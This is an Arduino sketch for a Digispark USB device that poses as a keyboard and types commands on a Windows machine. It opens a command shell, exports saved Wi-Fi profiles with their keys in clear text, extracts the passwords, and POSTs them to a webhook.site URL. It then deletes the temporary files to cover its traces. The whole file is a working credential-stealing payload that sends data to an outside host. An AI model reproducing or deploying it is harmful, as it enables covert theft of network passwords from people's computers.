#include "DigiKeyboard.h"

// Arrow Keys not defined in DigiKeyboard.h for some reason
// Manually defining them
#define KEY_ARROW_LEFT 0x50
#define KEY_ARROW_RIGHT 0x4F
#define KEY_ARROW_DOWN 0x51
#define KEY_ARROW_UP 0x52

void setup() {}

void loop() {
  // Initialise digispark 
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(100);

  // Opens the run dialog and launches command shell
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.println("cmd");
  DigiKeyboard.delay(500);
  
  // Creates temporary directory
  DigiKeyboard.println("cd %temp%");
  DigiKeyboard.delay(500);

  // Get Wifi network profiles using netsh (https://www.makeuseof.com/windows-back-up-restore-network-profiles/)
  DigiKeyboard.println("netsh wlan export profile key=clear");
  DigiKeyboard.delay(500);
  // Output required info into a temporary file using powershell
  DigiKeyboard.println("powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS"); 
  DigiKeyboard.delay(500);
  // Send info to remote webhook URL
  DigiKeyboard.println("powershell Invoke-WebRequest -Uri https://webhook.site/aa586e09-a372-495c-ae8e-e09876e704a7 -Method POST -InFile Wi-Fi-PASS"); 
  DigiKeyboard.delay(500);
  // Delete temporary file
  DigiKeyboard.println("del Wi-* /s /f /q");
  DigiKeyboard.delay(500);
  DigiKeyboard.println("exit");
  
  for (;;) {/* Stops the loop */}
}